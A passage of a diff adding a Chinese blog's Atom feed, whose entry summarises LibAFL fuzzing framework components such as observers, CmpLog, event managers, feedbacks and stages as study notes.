@@ -1,0 +1,2216 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://augu5tu.github.io</id>
+    <title>Augu5tu-飞光</title>
+    <updated>2025-05-26T04:47:09.078Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://augu5tu.github.io"/>
+    <link rel="self" href="https://augu5tu.github.io/atom.xml"/>
+    <subtitle>飞光之下，对结构与失序的片刻凝视，录于此间：对若干封闭系统的交互逻辑作审慎考察；观测特定输入变异对系统状态产生的效应；以及某些非预期行为的溯源与校正。&lt;br&gt;
+另，偶于叙事构造中暂留。&lt;br&gt;</subtitle>
+    <logo>https://augu5tu.github.io/images/avatar.png</logo>
+    <icon>https://augu5tu.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, Augu5tu-飞光</rights>
+    <entry>
+        <title type="html"><![CDATA[LibAFL 框架总结]]></title>
+        <id>https://augu5tu.github.io/post/libafl-summary/</id>
+        <link href="https://augu5tu.github.io/post/libafl-summary/">
+        </link>
+        <updated>2025-05-22T08:52:57.000Z</updated>
+        <content type="html"><![CDATA[<p>LibAFL的相关教程还是太少了，之前学习的时候主要是依靠epi的<a href="https://epi052.gitlab.io/notes-to-self/blog/2021-11-01-fuzzing-101-with-libafl/">系列博客</a>，但问题其实挺大，最主要的是版本比较老了，当时他用的是0.10.1的，而且就了解整个LibAFL来说，他的博客其实是目标驱动的，我认为选择的时候并没有介绍选择某个组件的理由（为什么不选其他的，我们是否还有别的选择之类），这当然不是作者的问题，但鉴于LibAFL并没有一个学习难度足够平滑的教程，我们唯一的选择大概只有看它的API文档，恰巧rust自动生成的API文档其实足够翔实，我来总结一下，方便自己对LibAFL的大部分组件有一个初步的笼统的了解，另附LibAFL简单介绍，用于应付面试</p>
+<h3 id="tokens">tokens</h3>
+<p>Tokens 是一些对目标程序有特殊意义的字节序列或字符串，比如文件格式的魔术数字、协议的关键词等。在 LibAFL 中，我们可以通过提供一个 token 文件，将这些 tokens 加载到 Fuzzing 状态的元数据中。然后，像 <code>StdMOptMutator</code> 配合 <code>tokens_mutations</code> 这样的变异器，就可以在变异输入时使用这些 tokens，例如将它们插入或替换到现有输入中。这样做的好处是，Fuzzer 可以更快地生成能够通过程序初步解析、触及更深代码逻辑的输入，从而提高发现漏洞的效率，特别是对于那些输入结构要求比较严格的目标程序。</p>
+<h3 id="duration">Duration</h3>
+<p>rust标准库中用来表示时间跨度的一个结构体</p>
+<h3 id="module">module</h3>
+<p>对于libafl_qemu中的module，准确描述为：</p>
+<ul>
+<li><strong>扩展 QEMU 功能的插件或钩子 (Hooks)</strong>：它们允许你在 QEMU 模拟执行目标程序的各个关键阶段注入自定义的 Rust 代码。</li>
+<li><strong>信息收集与交互</strong>：它们的主要目的是从 QEMU 的执行流中收集对 Fuzzing 有用的信息（如边覆盖率、比较指令的操作数），或者与 Fuzzer 的其他组件（如 Observer）进行交互以传递这些信息。</li>
+<li><strong>行为修改 (有限)</strong>：在某些情况下，它们也可以轻微地修改 QEMU 的行为或目标程序的状态，但主要不是用来“传递命令”给 QEMU 以执行任意操作。QEMU 的主要行为还是由 <code>Emulator</code> 对象及其方法（如 <code>run</code>, <code>set_breakpoint</code>, <code>write_reg</code> 等）来控制。</li>
+</ul>
+<p><strong><code>StdEdgeCoverageModule</code> 如何工作（回顾）：</strong></p>
+<ul>
+<li>它在 QEMU 翻译或执行基本块时，设置钩子。</li>
+<li>当发生基本块跳转（边执行）时，它内部的逻辑（或其关联的 helper）会计算边的哈希，并更新由 <code>edges_observer</code> 指向的共享内存区域。</li>
+<li>它<strong>不是给 QEMU 发命令</strong>说“记录这条边”，而是<strong>利用 QEMU 提供的钩子点</strong>，在适当的时候自己执行记录操作。</li>
+</ul>
+<p><strong><code>CmpLogModule</code> 对于 Fuzzer 的具体作用</strong>：</p>
+<ol>
+<li>提供变异提示 (Mutation Hints)：
+<ul>
+<li>收集到的比较操作数（尤其是那些其中一个操作数来源于 Fuzzer 输入，另一个是程序内部的常量或计算值）是非常有价值的“字典”或“token”。</li>
+<li>例如，如果 <code>CmpLogModule</code> 记录到程序将输入的某个部分与字符串 &quot;USER_ADMIN&quot; 进行了比较，那么 Fuzzer 在后续的变异中就可以尝试将输入的相应部分修改为 &quot;USER_ADMIN&quot;。</li>
+</ul>
+</li>
+<li>驱动 Input-to-State (I2S) 变异器：
+<ul>
+<li>像 <code>I2SRandReplace</code> 这样的变异器，其核心思想就是利用这些从运行时状态（如 CmpLog）中收集到的值。</li>
+<li><code>CmpLogObserver</code> 会读取由 <code>CmpLogModule</code> 收集的数据，并通过 <code>State</code> 的元数据 (Metadata) 系统提供给 <code>I2SRandReplace</code>。</li>
+<li><code>I2SRandReplace</code> 就可以使用这些记录的比较值来智能地替换输入中的字节，目标是直接满足之前观察到的比较条件，从而引导程序进入新的分支。这通常比纯粹的随机变异（如 bit flipping）更有效率地发现新路径。</li>
+</ul>
+</li>
+<li><strong>Redqueen 技术的基础</strong>：CmpLog 是 Redqueen（或称 Input-to-State an Input-to-State Transformation）这类 Fuzzing 技术的基础。Redqueen 尝试自动解决程序中的比较检查，将被污染的（来自输入的）操作数替换为目标值，从而“净化”输入，使其通过检查。</li>
+</ol>
+<h2 id="具体模块">具体模块</h2>
+<h3 id="observer">observer</h3>
+<h4 id="cmp">cmp</h4>
+<p><code>CmpLogObserver</code> 的核心作用是在 Fuzzing 过程中<strong>捕获和记录目标程序执行比较指令（如 <code>if (a == b)</code>) 时的操作数值</strong>。这种技术通常被称为 &quot;RedQueen&quot;、&quot;LAF-intel&quot; 或 &quot;CompareCoverage&quot;。</p>
+<p><strong>为什么重要</strong>: 很多程序包含大量的条件检查，Fuzzer 如果只是随机变异输入，很难猜到满足这些检查的确切值，从而无法进入新的代码路径。<code>CmpLogObserver</code> 通过记录实际参与比较的值，为 Fuzzer 提供了“线索”，帮助它：</p>
+<ul>
+<li><strong>绕过检查</strong>: 当 Fuzzer 知道输入 <code>0x41</code> 与常量 <code>0x78</code> 进行了比较但未通过时，它可以尝试将输入修改为 <code>0x78</code>。</li>
+<li><strong>探索更深路径</strong>: 通过满足更多的条件检查，Fuzzer 可以触及之前未曾覆盖到的代码。</li>
+<li><strong>提高效率</strong>: 相比盲目猜测，这是一种更智能、更具指导性的变异方式。</li>
+</ul>
+<p><code>libafl::observers::cmp</code> 提供了处理比较日志的<strong>通用组件和接口</strong>。<code>StdCmpObserver</code> 是其中的一个通用实现，依赖于 <code>CmpMap</code> 来获取数据。</p>
+<p><code>libafl_targets::cmps::observers::cmplog::CmpLogObserver</code></p>
+<p>是一个 <code>CmpObserver</code> 的具体实现</p>
+<p><strong>它的“特定性”在于，它被设计为直接与 <code>libafl_qemu</code> 的 <code>CmpLogModule</code> 紧密配合。</strong> <code>CmpLogModule</code> 是 QEMU 特有的，它在 QEMU 执行目标程序时，会将捕获到的比较指令操作数写入一块特定格式的共享内存区域。</p>
+<h4 id="concolic">concolic</h4>
+<p>“Concolic”（符号化执行与具体执行相结合）是一种更高级的模糊测试技术。简单来说，它分几步走：</p>
+<ol>
+<li>程序会用一个<strong>具体的</strong>输入值运行（就像普通的模糊测试）。</li>
+<li>在运行时，它会<strong>符号化地</strong>追踪输入是如何影响程序执行路径的，并记录下程序走到当前路径所必须满足的条件（称为路径约束）。</li>
+<li>然后，它会用一个<strong>约束求解器</strong>来分析这些条件，并尝试找到能够满足一组略微不同条件的新输入值，目标是引导程序在下一次执行时走上一条<strong>新的路径</strong>。</li>
+</ol>
+<p>这种方法对于绕过那些随机变异很难通过的复杂检查特别有用。</p>
+<p>“符号化”就是： <strong>程序在处理输入（或者由输入派生出来的数据）时，不立即使用输入的具体数值，而是用一个代号（符号）来代表它，并且记录下程序对这个代号所做的所有运算和比较，形成了一系列的“数学公式”（符号表达式）。</strong></p>
+<p>“路径约束”就是： <strong>一个包含了所有符号化条件（这些条件都依赖于程序的输入）的集合，这个集合精确地描述了程序为了执行到当前这一特定代码路径，其输入必须满足的所有逻辑条件。</strong> 每一条从程序开始到某个点的执行路径，都有其对应的一组路径约束。</p>
+<p><strong>约束求解器在 concolic fuzzing 中的核心作用就是：</strong></p>
+<p><strong>根据 fuzzer “想要”探索的新路径所对应的逻辑条件（修改后的路径约束），智能地计算出能够实际驱动程序走到那条新路径的具体输入值。</strong></p>
+<h4 id="map">map</h4>
+<ol>
+<li>Map Observer 基础</li>
+</ol>
+<ul>
+<li><strong>核心作用</strong>：观察一块共享内存区域（“地图”），这块地图由被<strong>插桩的目标程序</strong>在执行时更新，用以记录代码执行信息，最常见的是<strong>代码覆盖率</strong>。</li>
+<li><strong>AFL风格</strong>：其设计深受AFL影响，覆盖率地图通常记录的是程序执行的“边”（edges）或基本块。</li>
+<li>工作流程：
+<ol>
+<li><strong>插桩</strong>：目标程序被插桩。</li>
+<li><strong>标记</strong>：目标执行时，插桩代码根据执行路径修改“地图”中的内容（如对应字节+1）。</li>
+<li><strong>观察</strong>：LibAFL中的 <code>MapObserver</code> 在目标执行后读取“地图”状态。</li>
+<li><strong>反馈</strong>：将观察到的“地图”信息传递给 <code>Feedback</code> 组件，判断输入是否发现了新的覆盖率或其他“有趣”的行为，从而指导后续的输入选择和变异。</li>
+</ol>
+</li>
+<li><strong><code>MapObserver</code> Trait (接口)</strong>：定义了所有 map observer 的基本行为和契约。</li>
+<li><strong><code>StdMapObserver</code> Struct (结构体)</strong>：是 <code>MapObserver</code> 的标准、常用具体实现，用于观察由目标程序更新的地图状态。</li>
+</ul>
+<hr>
+<ol start="2">
+<li>“地图”本身与大小问题</li>
+</ol>
+<ul>
+<li><strong>“地图”</strong>：一块内存区域，用作位图或字节数组，其每个条目对应程序中可能发生的“事件”或“特征”（主要是边的覆盖）。</li>
+<li><strong>边的映射</strong>：通过哈希算法（如 <code>(当前位置 ^ 上一个位置) % MAP_SIZE</code>）将代码执行的“边”映射到地图中的一个索引。</li>
+<li><strong>哈希碰撞</strong>：由于地图大小有限（如AFL的64KB），不同的实际代码边可能会映射到地图的同一个位置，这是可接受的，Fuzzer关注的是地图上是否出现了新的变化。</li>
+</ul>
+<hr>
+<ol start="3">
+<li>不同类型的 Map Observer</li>
+</ol>
+<ul>
+<li><strong><code>ConstMapObserver</code> (固定大小地图观察者)</strong>
+<ul>
+<li><strong>含义</strong>：Fuzzer使用的覆盖率地图的大小在Fuzzer<strong>编译时就已确定并固定不变</strong>（例如，硬编码为64KB）。</li>
+<li><strong>&quot;编译时知道大小&quot;</strong>：指Fuzzer开发者在编写Fuzzer时确定了地图数据结构的大小，而非指静态分析出目标程序确切的边数量。</li>
+<li><strong>优势</strong>：编译器可能对固定大小的内存操作进行优化，加速 <code>Feedback::is_interesting</code> 的判断。</li>
+<li><strong>适用场景</strong>：标准的AFL式Fuzzing，地图大小预先设定。</li>
+</ul>
+</li>
+<li><strong><code>VariableMapObserver</code> (可变大小地图观察者)</strong>
+<ul>
+<li><strong>含义</strong>：关注地图中<strong>实际被使用的部分的大小</strong>。这个“有效大小”可能小于预分配的总大小，并且可能随执行而变化。</li>
+<li><strong>优势</strong>：允许Fuzzer更精细地处理有效数据，可能在分析或同步地图时带来优化（例如，只处理“实际使用的256KB”，而不是整个“1MB”）。</li>
+<li><strong>澄清</strong>：它不一定意味着地图内存本身在物理上频繁调整大小，更多的是Fuzzer如何理解和利用地图的动态有效区域。</li>
+</ul>
+</li>
+<li><strong><code>hitcount_map</code> Observer (命中次数地图观察者)</strong>
+<ul>
+<li><strong>功能</strong>：不仅记录边是否被命中，还近似记录其<strong>命中次数</strong>。</li>
+<li><strong>分桶 (Bucketing)</strong>：由于地图条目通常为1字节（0-255），使用分桶策略将不同的命中次数范围映射到有限的字节值上（如1次、2次、3次、4-7次、8-15次等）。</li>
+<li><strong>反馈价值</strong>：能提供比简单二进制覆盖更细致的反馈，当输入使边的命中次数进入新的“桶”时，也被视为有趣。</li>
+</ul>
+</li>
+<li><strong><code>owned_map</code> Observer (<code>OwnedMapObserver</code>)</strong>
+<ul>
+<li><strong>核心区别</strong>：与 <code>StdMapObserver</code>（通常观察外部管理的共享内存）不同，<code>OwnedMapObserver</code> <strong>自己分配并拥有其观察的地图内存</strong>。</li>
+<li><strong>用途</strong>：简化某些场景的设置，如进程内Fuzzing，或不使用传统AFL forkserver共享内存机制的场景。它在解释地图内容的逻辑上与 <code>StdMapObserver</code> 类似。</li>
+</ul>
+</li>
+<li><strong><code>multi_map</code> Observer (<code>MultiMapObserver</code>)</strong>
+<ul>
+<li><strong>功能</strong>：允许<strong>同时观察和合并来自多个不同地图（内存区域）的信息</strong>。</li>
+<li><strong>用途</strong>：当插桩产生多种类型的覆盖数据（如边覆盖、CmpLog数据）或来自多个独立组件的地图时，<code>MultiMapObserver</code> 提供一个统一的接口来处理这些数据。它可能是概念上的合并（综合判断）而非物理合并。</li>
+</ul>
+</li>
+<li><strong><code>macros</code> (位于 <code>libafl::observers::map</code> 下的模块)</strong>
+<ul>
+<li><strong>功能</strong>：主要提供与地图相关的<strong>辅助宏</strong>，供其他Observer或Feedback组件内部使用。</li>
+<li>例如 <code>crate::require_index_tracking</code> 和 <code>crate::require_novelties_tracking</code> 暗示了这些宏用于启用或检查与追踪地图索引变化和新颖性相关的功能。</li>
+<li>它本身不直接提供一个用户可实例化的 Observer 类型。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ol start="4">
+<li>核心要点回顾</li>
+</ol>
+<ul>
+<li>Map Observer 是覆盖率引导Fuzzing的基石。</li>
+<li>它依赖于目标程序的<strong>插桩</strong>来更新共享的“地图”。</li>
+<li>最常见的用途是AFL风格的<strong>边覆盖率</strong>（通常带命中次数）。</li>
+<li><code>StdMapObserver</code> 是基础，其他类型如 <code>ConstMapObserver</code>, <code>VariableMapObserver</code>, <code>OwnedMapObserver</code>, <code>HitCountMapObserver</code>, <code>MultiMapObserver</code> 提供了针对不同需求（地图大小管理、数据解释、多源数据、内存所有权）的特化或变种。</li>
+</ul>
+<h3 id="monitor">monitor</h3>
+<p><code>Monitor</code> 的核心职责就是<strong>收集、统计和展示 Fuzzer 的运行状态和各种统计信息</strong>。</p>
+<h3 id="events">events</h3>
+<p><strong>核心职责</strong>： <code>EventManager</code> 是 LibAFL 中负责<strong>通信和协调</strong>的核心组件。它管理 Fuzzer 实例之间或 Fuzzer 内部组件之间的<strong>事件流</strong>。这些事件可以是新发现的测试用例、代码覆盖信息、统计数据、崩溃报告、日志消息等。</p>
+<p><strong>关键理念</strong>：</p>
+<ul>
+<li><strong>按需拼凑与灵活性</strong>：<code>EventManager</code> 不是一个固定的“积木块”，而是按需选择和组合的“能力”组件。用户根据 Fuzzing 目标和部署环境选择合适的实现。</li>
+<li><strong>事件驱动</strong>：Fuzzer 的许多活动和发现都以 <code>Event</code> 的形式进行封装和传递。</li>
+<li><strong>模块化与可扩展性</strong>：通过 Traits 和不同的模块化实现，支持从简单的单机日志到复杂的多机器协同 Fuzzing。</li>
+</ul>
+<hr>
+<p><strong>一、 通用组件与概念 (<code>libafl::events</code>)</strong></p>
+<ul>
+<li><strong><code>Event</code> (枚举)</strong>:
+<ul>
+<li>事件系统的核心数据结构，定义了所有可传递的事件类型，如：
+<ul>
+<li>新测试用例 (<code>NewTestcase</code>)</li>
+<li>统计数据 (<code>Stats</code>)</li>
+<li>目标程序崩溃 (<code>Crash</code>)</li>
+<li>自定义用户事件 (<code>CustomBuf</code>)</li>
+<li>日志消息 (<code>Log</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>EventManagerId</code> (结构体)</strong>:
+<ul>
+<li>为每个 Fuzzer 实例提供唯一ID，在多进程环境中尤为重要。</li>
+</ul>
+</li>
+<li><strong><code>NopEventManager</code> (结构体)</strong>:
+<ul>
+<li>“空操作”事件管理器，不执行实际事件处理，主要用于测试或不需要事件管理的简单场景。</li>
+</ul>
+</li>
+<li><strong><code>MonitorTypedEventManager</code> (结构体)</strong>:
+<ul>
+<li>包装器，为其他 <code>EventManager</code> 关联一个 <code>Monitor</code> 类型，以统一API。</li>
+</ul>
+</li>
+<li><strong><code>ShutdownSignalData</code> (结构体) 与 <code>EVENTMGR_SIGHANDLER_STATE</code> (静态变量)</strong>:
+<ul>
+<li>用于捕获 <code>ctrl-c</code> 信号，实现 Fuzzer 的优雅退出。</li>
+</ul>
+</li>
+<li><strong>核心 Traits (接口)</strong>:
+<ul>
+<li><code>EventFirer</code>: 定义发送（触发）事件的能力。</li>
+<li><code>EventReceiver</code>: 定义处理接收到的事件的能力。</li>
+<li><code>EventRestarter</code>: 规范可重启事件管理器的行为（如 <code>on_restart</code>）。</li>
+<li><code>HasEventManagerId</code>: 允许查询 <code>EventManager</code> 的唯一ID。</li>
+<li><code>ProgressReporter</code>: 定义客户端向 Broker 报告 Fuzzing 进度的能力。</li>
+<li><code>SendExiting</code>: 定义 Fuzzer 退出前发送通知的能力。</li>
+<li><code>AwaitRestartSafe</code>: 定义安全等待重启的行为。</li>
+</ul>
+</li>
+<li><strong>辅助函数</strong>:
+<ul>
+<li>提供一些 Trait 方法的默认实现，如 <code>std_maybe_report_progress</code>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>二、 <code>EventManager</code> 的不同实现模块</strong></p>
+<ol>
+<li><strong><code>simple</code> (<code>libafl::events::simple</code>)</strong>:
+<ul>
+<li><strong>特点</strong>: 非常简单的事件管理器，主要支持日志输出，<strong>不支持多进程间的事件通信</strong>。</li>
+<li><strong><code>SimpleEventManager</code></strong>: 基础的单线程、仅日志记录的实现。</li>
+<li><strong><code>SimpleRestartingEventManager</code></strong>: (你代码中使用的) 在 <code>SimpleEventManager</code> 基础上增加了<strong>子进程重启功能</strong>，增强了单机 Fuzzing 的鲁棒性。它通过 <code>Monitor</code> 输出日志。</li>
+</ul>
+</li>
+<li><strong><code>llmp</code> (<code>libafl::events::llmp</code>)</strong>: Low Level Message Passing
+<ul>
+<li><strong>特点</strong>: 专为<strong>可扩展的单机多进程 Fuzzing</strong> 设计的高性能、低开销进程间通信 (IPC) 机制。</li>
+<li><strong>核心技术</strong>: 主要依赖<strong>共享内存</strong>和<strong>无锁/接近无锁</strong>的数据结构。</li>
+<li><strong><code>restarting</code> 子模块</strong>: 提供了可重启的 LLMP 事件管理器，能在子进程崩溃时重启并可能恢复状态。</li>
+<li><strong>其他特性</strong>: 支持消息压缩 (<code>COMPRESS_THRESHOLD</code>)，状态持久化配置 (<code>LlmpShouldSaveState</code>)。</li>
+<li><strong>与LLVM无关</strong>: LLMP 是 LibAFL 内部的通信机制，与编译器基础设施 LLVM 没有直接关系。</li>
+</ul>
+</li>
+<li><strong><code>tcp</code> (<code>libafl::events::tcp</code>)</strong>:
+<ul>
+<li><strong>特点</strong>: 用于实现<strong>跨多台机器的分布式 Fuzzing</strong>，使用 <strong>TCP/IP 协议</strong>进行网络通信。</li>
+<li>架构: 通常采用 Broker-Client 模型。
+<ul>
+<li><code>TcpEventBroker</code>: 实现 Broker 角色，监听 TCP 连接，中转事件。</li>
+<li><code>TcpEventManager</code>: 客户端事件管理器，通过 TCP 发送事件给 Broker。</li>
+</ul>
+</li>
+<li><strong><code>TcpRestartingEventManager</code></strong>: 支持在网络环境中重启 Fuzzer 实例并恢复状态。</li>
+</ul>
+</li>
+<li><strong><code>launcher</code> (<code>libafl::events::launcher</code>)</strong>:
+<ul>
+<li><strong>核心作用</strong>: <strong>并行启动和管理多个 Fuzzer 实例</strong>，简化在多核 CPU 上的并行 Fuzzing 设置。</li>
+<li>功能:
+<ul>
+<li>自动管理 Broker 启动。</li>
+<li>隐藏/显示子进程输出。</li>
+<li>支持通过 TCP 连接多节点/多机器。</li>
+<li>在 Unix 系统上可选择使用 <code>fork</code> 或重新执行命令的方式创建子进程。</li>
+</ul>
+</li>
+<li><strong><code>CentralizedLauncher</code></strong>: 特殊版本，旨在最小化共享测试用例的重复执行。</li>
+</ul>
+</li>
+<li><strong><code>broker_hooks</code> (<code>libafl::events::broker_hooks</code>)</strong>:
+<ul>
+<li><strong>作用</strong>: 为 <strong>Broker 进程</strong>提供扩展机制，允许用户在 Broker 处理标准事件的流程中，通过<strong>挂载自定义代码 (Hooks)</strong> 来修改或增强 Broker 的行为。</li>
+<li><strong><code>StdLlmpEventHook</code></strong>: 基于 LLMP 的 Broker 钩子具体实现。</li>
+<li><strong>非处理特殊“钩子事件”</strong>: 而是为 Broker 的标准事件处理流程提供扩展点。</li>
+</ul>
+</li>
+<li><strong><code>centralized</code> (<code>libafl::events::centralized</code>)</strong>:
+<ul>
+<li><strong>作用</strong>: 实现一种<strong>更高效的消息传递架构</strong>，通常采用<strong>主从 (main-secondary) 架构</strong>，可能与另一个 Broker 协同工作。</li>
+<li><strong><code>CentralizedEventManager</code></strong>: 核心实现，作为包装器协调主从节点间的事件流。</li>
+<li><strong>目标</strong>: 优化大规模 Fuzzing 集群中的消息路由和分发，减少通信开销。</li>
+</ul>
+</li>
+<li><strong><code>events_hooks</code> (<code>libafl::events::events_hooks</code>)</strong>:
+<ul>
+<li><strong>作用</strong>: 允许用户在 <code>EventManager</code> <strong>尝试接收 (<code>try_receive</code>) 来自其他客户端的消息之前或之后</strong>，注入自定义的预处理或后处理代码。</li>
+<li><strong>实现方式</strong>: 主要通过定义 <code>EventManagerHook</code> Trait，用户可自行实现具体钩子逻辑（如解密、校验、日志）。</li>
+<li><strong>关注点</strong>: <code>EventManager</code> 的消息接收流程。</li>
+</ul>
+</li>
+<li><strong><code>multi_machine</code> (<code>libafl::events::multi_machine</code>)</strong>:
+<ul>
+<li><strong>作用</strong>: 支持<strong>跨多台物理机器进行协同 Fuzzing</strong> 的组件。</li>
+<li>核心功能:
+<ul>
+<li>基于 TCP 的跨机器通信 (<code>MultiMachineMsg</code>)。</li>
+<li>节点管理与策略定义 (<code>NodeDescriptor</code>, <code>NodePolicy</code>)。</li>
+<li>多机器 Broker 钩子 (<code>TcpMultiMachineHooks</code>)。</li>
+<li>网络通信相关的状态管理 (<code>TcpMultiMachineState</code>)。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="feedback">feedback</h3>
+<p><code>Feedback</code> 机制的核心作用是在目标程序每次执行后，<strong>分析来自 <code>Observer</code> (观察者) 的原始执行数据，并判断刚刚执行的输入是否“有趣” (is_interesting)</strong>。如果一个输入被判定为“有趣”，它通常会被添加到语料库 (<code>Corpus</code>) 中，作为后续输入变异的基础。它是覆盖率引导 Fuzzing 的关键。</p>
+<p><strong>核心流程</strong>：</p>
+<ol>
+<li><code>Observer</code> 收集原始执行数据（如覆盖率、时间、比较日志等）。</li>
+<li><code>Feedback</code> 分析这些数据。</li>
+<li><code>Feedback</code> 返回一个布尔值 (<code>is_interesting</code>)，指示输入是否有价值。</li>
+</ol>
+<hr>
+<p><strong>主要的 <code>Feedback</code> 类型与模块</strong></p>
+<ul>
+<li><strong>基于代码覆盖率 (<code>libafl::feedbacks::map</code>)</strong>:
+<ul>
+<li><strong><code>MaxMapFeedback</code></strong>: (常用) 配合边覆盖率观察者 (<code>HitcountsMapObserver</code>)，当输入触发新代码边或使边的命中次数进入新“桶”时，判定为有趣。目标是最大化覆盖。</li>
+</ul>
+</li>
+<li><strong>基于执行退出类型 (<code>ExitKind</code>)</strong>:
+<ul>
+<li><strong><code>CrashFeedback</code></strong>: (常用) 当目标程序崩溃 (<code>ExitKind::Crash</code>) 时，判定为有趣。</li>
+<li><strong><code>TimeoutFeedback</code></strong>: (常用) 当目标程序超时 (<code>ExitKind::Timeout</code>) 时，判定为有趣。</li>
+<li><code>ExitKindFeedback</code>: 更通用的 <code>ExitKind</code> 检查反馈。</li>
+<li><code>DiffExitKindFeedback</code>: 用于差分 Fuzzing，比较不同执行的 <code>ExitKind</code> 差异。</li>
+</ul>
+</li>
+<li><strong>基于时间 (<code>libafl::feedbacks::TimeFeedback</code>)</strong>:
+<ul>
+<li>与 <code>TimeObserver</code> 配合，跟踪执行时间。可以将执行时间作为辅助反馈，或用于确保输入执行时间在合理范围内。</li>
+</ul>
+</li>
+<li><strong>基于特定值/模式</strong>:
+<ul>
+<li><code>BoolValueFeedback</code>: 返回固定的 <code>true</code> 或 <code>false</code>。</li>
+<li><code>NewHashFeedback</code>: 使用回溯哈希等判断案例是否新颖。</li>
+<li><code>ValueBloomFeedback</code>: 使用布隆过滤器检查值是否新观察到。</li>
+</ul>
+</li>
+<li><strong>特殊用途</strong>:
+<ul>
+<li><code>CaptureFeedback</code>: 捕获特定事件（如超时）的输入。</li>
+<li><code>ConcolicFeedback</code>: 用于混合执行/符号执行。</li>
+<li><code>NautilusFeedback</code>: 与 Nautilus 基于语法的 Fuzzer 配合。</li>
+<li><code>CustomFilenameToTestcaseFeedback</code>: 自定义文件名与测试用例的关联。</li>
+<li><code>DifferentialFeedback</code>: 比较两个同类型观察者的内容差异。</li>
+<li><code>StdIoFeedback</code>: 基于标准输出/错误流的内容。</li>
+<li><code>TransferredFeedback</code>: 检测测试用例是否从其他 Fuzzer 节点传输而来。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>：</p>
+<ul>
+<li><code>Feedback</code> 是 Fuzzing 循环中进行决策的关键，它决定了哪些输入值得保留和进一步变异。</li>
+<li>它将 <code>Observer</code> 收集的原始、复杂数据简化为“有趣”或“不有趣”的判断。</li>
+<li>通过组合不同的 <code>Feedback</code>，可以构建出复杂的、多维度的输入评估标准。</li>
+<li><code>MaxMapFeedback</code> (覆盖率) 和 <code>CrashFeedback</code> 是最基础和最重要的 Feedback 类型之一。</li>
+</ul>
+<h3 id="stages">stages</h3>
+<p>在 LibAFL 中，一个 <strong><code>Stage</code></strong> 代表 Fuzzing 过程中的一个<strong>不同操作步骤或技术</strong>。它通常针对语料库 (<code>Corpus</code>) 中的单个输入（测试用例）进行处理，目的是分析、修改该输入，或者利用它来创造新的、有趣的测试用例，或为现有测试用例添加元数据。可以将 Fuzzing 过程看作一个流水线，每个 <code>Stage</code> 是流水线中的一个环节。</p>
+<p><strong><code>Stage</code> Trait (核心接口)</strong>: 所有 Stage 都必须实现此接口，定义了一个 Fuzzing 步骤的核心逻辑，如 <code>perform(...)</code> 方法。</p>
+<p><strong><code>StagesTuple</code> Trait</strong>: 允许将多个 Stage 组合在一起，按顺序对每个输入执行。</p>
+<hr>
+<p><strong>一、 主要的 <code>Stage</code> 类型/模块</strong></p>
+<ul>
+<li><strong><code>mutational</code> (变异阶段)</strong>:
+<ul>
+<li><strong>核心 Fuzzing 步骤</strong>：获取输入，使用 <code>Mutators</code> (变异器) 进行多次随机变异，执行变异后的输入，并由 <code>Feedbacks</code> (反馈) 评估是否“有趣” (如产生新覆盖或崩溃)。</li>
+<li>示例：<code>StdMutationalStage</code>。</li>
+</ul>
+</li>
+<li><strong><code>power</code> (能量调度阶段)</strong>:
+<ul>
+<li><strong>与能量调度配合</strong>：根据“能量”或优先级分配 Fuzzing 精力（如变异次数）给不同的输入。</li>
+<li>通常在 <code>CalibrationStage</code> 之后。</li>
+<li>示例：<code>StdPowerMutationalStage</code> (结合变异与能量调度)。</li>
+</ul>
+</li>
+<li><strong><code>calibrate</code> (校准阶段)</strong>:
+<ul>
+<li><strong>初始度量</strong>：收集目标执行的初始指标，如平均执行时间、初始覆盖图状态/大小。</li>
+<li>为后续的 Feedback 和 Scheduler 提供基准数据。</li>
+</ul>
+</li>
+<li><strong><code>tracing</code> (追踪阶段)</strong>:
+<ul>
+<li><strong>收集元数据</strong>：追踪目标执行，用元数据（如 <code>CmpLog</code> 比较日志）丰富测试用例。</li>
+<li>示例：<code>ShadowTracingStage</code> (常用于 QEMU 模式收集 CmpLog)。</li>
+</ul>
+</li>
+<li><strong><code>shadow</code> (影子执行阶段)</strong>:
+<ul>
+<li><strong>并行追踪/观察</strong>：运行一个“影子”执行器和观察者，可以与进程内执行器一起使用。用于收集主执行路径之外的详细信息或不同类型的观察数据。</li>
+</ul>
+</li>
+<li><strong><code>generation</code> (生成阶段)</strong>:
+<ul>
+<li><strong>从头创建输入</strong>：专注于生成单个新输入并评估，适用于基于语法或生成式 Fuzzing。</li>
+<li>示例：<code>GenStage</code>。</li>
+</ul>
+</li>
+<li><strong><code>tmin</code> (测试用例最小化阶段)</strong>:
+<ul>
+<li><strong>减小输入大小</strong>：尝试在保持输入“有趣”特性的前提下，最小化其大小。</li>
+<li>示例：<code>StdTMinMutationalStage</code>。</li>
+</ul>
+</li>
+<li><strong>同步阶段</strong>:
+<ul>
+<li><code>dump</code> (<code>DumpToDiskStage</code>): 将当前语料库和崩溃转储到磁盘，便于持久化或与其他 Fuzzer (如 AFL++) 同步。</li>
+<li><code>sync</code> (<code>SyncFromDiskStage</code>): 从磁盘导入输入到语料库，用于同步或加载初始种子。</li>
+</ul>
+</li>
+<li><strong>其他特定用途/工具类阶段</strong>:
+<ul>
+<li><code>afl_stats</code>: 计算和报告 AFL++ 风格的统计信息。</li>
+<li><code>colorization</code>: 实现 AFL++ 的 &quot;colorization&quot; 技术 (与路径发现相关)。</li>
+<li><code>concolic</code>: 支持混合执行 (具体执行 + 符号执行) 的阶段。</li>
+<li><code>logics</code>: 阶段包装器，为阶段列表添加逻辑组合或条件。</li>
+<li><code>push</code>: 返回输入而不是直接调用执行器，用于自定义流程。</li>
+<li><code>replay</code>: 重新执行语料库中的所有输入一次。</li>
+<li><code>time_tracker</code>: 包装另一个阶段以专门追踪其执行时间。</li>
+<li><code>tuneable</code>: 变异迭代次数可在运行时动态调整的变异阶段。</li>
+<li><code>unicode</code>: 分析 Unicode 风格输入常见变异的阶段。</li>
